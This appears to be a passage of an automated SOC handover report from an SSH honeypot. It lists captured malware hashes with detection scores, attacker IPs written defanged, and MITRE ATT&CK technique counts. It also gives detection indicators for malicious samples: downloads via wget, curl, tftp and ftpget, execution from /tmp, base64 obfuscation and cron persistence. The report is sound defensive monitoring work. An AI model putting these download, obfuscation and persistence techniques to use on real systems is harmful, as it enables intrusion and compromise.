| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.233.85[.]194` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `81.215.2[.]43` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 3 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `218.58.73[.]238` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |
| `20.221.57[.]151` | US | Microsoft Corporation | **100** ⚠️ | 2 |
| `182.76.36[.]62` | IN | BHARTI-AIRTEL | **100** ⚠️ | 50 |
| `71.187.203[.]185` | US | Verizon Business | **100** ⚠️ | 3 |
| `119.160.166[.]237` | BN | eSpeed - Broadband DSL | **100** ⚠️ | 50 |
| `107.137.145[.]52` | US | Private Customer - AT&T Internet Services | **100** ⚠️ | 2 |
| `91.225.162[.]14` | UA | SPD Chernega Aleksandr Anatolevich | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 343 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 327 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 76 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 76 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 76 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 416 cases |
| Tool 34  | Credential Extractor        | ✅ 378 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 136 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (7.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 81 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 324 priority case(s) shown individually · 37 recon entry/entries in table (10 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-30T16:21:27Z_
